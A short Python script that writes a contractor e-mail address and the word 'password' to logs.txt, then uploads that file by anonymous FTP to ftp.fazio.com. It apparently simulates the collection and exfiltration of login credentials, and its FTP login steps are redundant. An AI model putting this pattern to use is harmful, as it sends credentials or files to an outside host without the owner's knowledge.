import ftplib

def main():
  f = open("logs.txt","a+")
  f.write("contractor@fazio.com \r\n")
  f.write("password \r\n")
  f.close()

  host = "ftp.fazio.com"
  port = 21
  username = "anonymous"
  password = "contractor@fazio.com"
  ftp = ftplib.FTP(host, username, password)
  ftp.connect(host, port)
  ftp.login()
  ftp.cwd("upload")
  ftp.storbinary("STOR logs.txt", open("logs.txt", "rb"))
  ftp.close()

if __name__== "__main__":
  main()